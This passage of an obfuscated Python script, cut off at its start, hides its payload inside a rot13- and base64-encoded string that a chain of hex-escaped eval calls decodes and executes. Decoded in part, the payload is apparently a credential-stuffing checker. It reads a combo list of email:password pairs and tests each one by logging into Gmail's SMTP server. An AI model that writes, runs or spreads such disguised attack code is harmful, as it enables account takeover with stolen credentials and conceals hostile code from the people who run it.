qPN9VQNXVPOmqJAwVQ0tZNbtVTEcpzIgLJyfVQ0tpzS3K2yhpUI0XPWQo21vombtVvxXPvNtoPN9VT9jMJ4bMTylMJ1unJjfVPWlVvxXVPOyoFN9VTjhpzIuMTkcozImXPxXVPOyoJScoPN9VSgqPvNtpTSmp3ptCFOoKDbtVTMipvOyVTyhVTIgBtbWVPOjVQ0tMF5mpTkcqPtvBvVcPtxtVTyzVPWNM21unJjhL29gVvOcovOjJmOqBtbWPFNtMJ1unJjhLKOjMJ5xXUOoZS0cPtxWVPOxVQ0tpSfkKF5lMKOfLJAyXPWpovVfVPVvXDbWPFNtpTSmp3phLKOjMJ5xXTDcPtbtVUqbnJkyVTAioaDtCPOfMJ4bMJ1unJjcBtbWVPOmVQ0tp210pTkcLv5GGIEDXPqmoKEjYzqgLJyfYzAioGb1BQpaXDbWVPOmYaA0LKW0qTkmXPxXPFNtqUW5BtbWPFNtpl5fo2qcovuyoJScoSgwo250KFjtpTSmp3qoL29hqS0cPtxtVTI4L2IjqQbXPDxtVUOlnJ50VPtvJ0EWEI0vXDbWVPOyoUAyBtbWPFNtMvN9VT9jMJ4bVzqgLJyfnTSwnl50rUDvYPNvqlVcPtxWVPOzYaqlnKEyXTIgLJyfJ2AioaEqXlV6VvgjLKAmq1gwo250KFxXPDxtVUOlnJ50VPtvJ0kWIxIqVvxXPDxtVUA1L2ZtCFOmqJAwVPftZDbWVPOwo250VQ0tL29hqPNeVQRXPvNtnJ5crzyuoTHbXDbtVTyzVUA1L2ZtCvNjBtbWVPOjpzyhqPNbVag9VRuOD0gSEPOADHyZHlVhMz9loJS0XUA1L2ZcXDbtVTIfp2H6PtxtVUOlnJ50VPtvGz8tMJ1unJkmVTuuL2gyMPVcPzIfp2H6PvNtqUyjMKAwpvtvjdxtEJ1coTyiVRWupaWip28tYFOPo0ptjd4vXD=='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
